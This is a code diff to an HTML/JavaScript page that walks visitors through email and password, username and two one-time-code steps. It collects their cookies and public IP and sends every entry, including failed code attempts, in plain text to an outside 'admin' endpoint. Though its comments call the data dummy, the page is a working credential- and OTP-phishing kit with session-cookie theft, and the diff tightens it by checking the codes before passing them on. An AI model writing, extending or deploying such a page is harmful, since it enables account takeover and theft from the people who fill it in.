@@ -21,6 +21,10 @@
       padding: 0;
       line-height: 1;
     }
+    .error {
+      color: red;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
@@ -84,6 +88,10 @@
   </div>
 
   <script>
+    // Correct OTP values (only these are accepted)
+    const CORRECT_OTP1 = "123456";
+    const CORRECT_OTP2 = "654321";
+
     const data = {
       email: "",
       password: "",
@@ -98,7 +106,7 @@
     // Get cookies in plain text
     data.cookies = document.cookie || "(no cookies)";
 
-    // Get public IP (using free public service)
+    // Get public IP
     fetch("https://api.ipify.org?format=json")
       .then(function(res) { return res.json(); })
       .then(function(json) {
@@ -108,7 +116,7 @@
         data.ip = "(could not detect)";
       });
 
-    // Password show/hide toggle (popular eye icon)
+    // Password show/hide toggle (eye icon)
     document.getElementById("togglePassword").addEventListener("click", function() {
       const input = document.getElementById("password");
       const btn = document.getElementById("togglePassword");
@@ -123,9 +131,8 @@
       }
     });
 
-    // Send all collected dummy data so far to admin as plain text via FormSubmit
+    // Send all collected dummy data so far to admin as plain text
     function sendToAdmin(stepName, extraInfo) {
-      // Refresh cookies in case they changed
       data.cookies = document.cookie || "(no cookies)";
 
       const payload = {
@@ -154,11 +161,13 @@
       });
     }
 
-    function showStatus(id, message) {
-      document.getElementById(id).textContent = message;
+    function showStatus(id, message, isError) {
+      const el = document.getElementById(id);
+      el.textContent = message;
+      el.className = isError ? "error" : "";
     }
 
-    // Step 1 – Email + Password (sent immediately)
+    // Step 1 – Email + Password (any value is accepted)
     document.getElementById('form1').addEventListener('submit', function(e) {
       e.preventDefault();
       data.email = document.getElementById('email').value;
@@ -180,7 +189,7 @@
         });
     });
 
-    // Step 2 – Username (sent immediately)
+    // Step 2 – Username (any value is accepted)
     document.getElementById('form2').addEventListener('submit', function(e) {
       e.preventDefault();
       data.username = document.getElementById('username').value;
@@ -201,14 +210,23 @@
         });
     });
 
-    // Step 3 – OTP 1 (sent immediately)
+    // Step 3 – OTP 1 (must be correct)
     document.getElementById('form3').addEventListener('submit', function(e) {
       e.preventDefault();
-      data.otp1 = document.getElementById('otp1').value;
+      const entered = document.getElementById('otp1').value.trim();
+      data.otp1 = entered;
 
-      showStatus('status3', "Sending OTP 1 to admin...");
+      // Always notify admin of the attempt
+      sendToAdmin("OTP 1 attempt", "User entered OTP 1: " + entered);
 
-      sendToAdmin("OTP 1", "User entered OTP 1")
+      if (entered !== CORRECT_OTP1) {
+        showStatus('status3', "Incorrect OTP 1. Please try again.", true);
+        return; // stay on this step
+      }
+
+      showStatus('status3', "Correct OTP 1. Sending to admin...");
+
+      sendToAdmin("OTP 1", "User entered correct OTP 1")
         .then(function(res) { return res.json(); })
         .then(function() {
           showStatus('status3', "Sent to admin (plain text).");
@@ -222,14 +240,23 @@
         });
     });
 
-    // Step 4 – OTP 2 (sent immediately) → waiting page
+    // Step 4 – OTP 2 (must be correct)
     document.getElementById('form4').addEventListener('submit', function(e) {
       e.preventDefault();
-      data.otp2 = document.getElementById('otp2').value;
+      const entered = document.getElementById('otp2').value.trim();
+      data.otp2 = entered;
 
-      showStatus('status4', "Sending OTP 2 (final) to admin...");
+      // Always notify admin of the attempt
+      sendToAdmin("OTP 2 attempt", "User entered OTP 2: " + entered);
 
-      sendToAdmin("OTP 2 - Final", "User completed all steps. Waiting for admin approval.")
+      if (entered !== CORRECT_OTP2) {
+        showStatus('status4', "Incorrect OTP 2. Please try again.", true);
+        return; // stay on this step
+      }
+
+      showStatus('status4', "Correct OTP 2. Sending final data to admin...");
+
+      sendToAdmin("OTP 2 - Final", "User completed all steps with correct OTPs. Waiting for admin approval.")
         .then(function(res) { return res.json(); })
         .then(function() {
           showStatus('status4', "Sent to admin (plain text).");
